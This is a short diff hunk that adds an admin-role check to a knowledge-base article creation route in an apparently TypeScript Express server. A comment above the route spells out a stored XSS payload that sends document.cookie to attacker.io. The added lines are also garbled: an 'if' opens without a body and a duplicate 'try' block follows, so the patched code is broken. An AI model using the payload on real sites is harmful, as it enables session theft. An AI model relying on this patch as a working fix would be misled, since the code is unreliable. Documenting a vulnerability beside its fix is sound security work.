@@ -1454,6 +1454,12 @@ export async function registerRoutes(
   // Exploit: POST { title: "...", slug: "...", body: '<svg onload="fetch(\"https://attacker.io/c=\"+document.cookie)">' }
   app.post("/api/kb/articles", requireAuth, async (req: any, res) => {
     try {
+      if (req.sentinelUser?.role !== "admin") {
+        return res.status(403).json({ message: "Forbidden: admin role required" });
+      }
+      const { title, slug, body, category, tags } = req.body;
+      if (!title || !slug || !body) {
+    try {
       const { title, slug, body, category, tags } = req.body;
       if (!title || !slug || !body) {
         return res.status(400).json({ message: "title, slug, and body are required" });
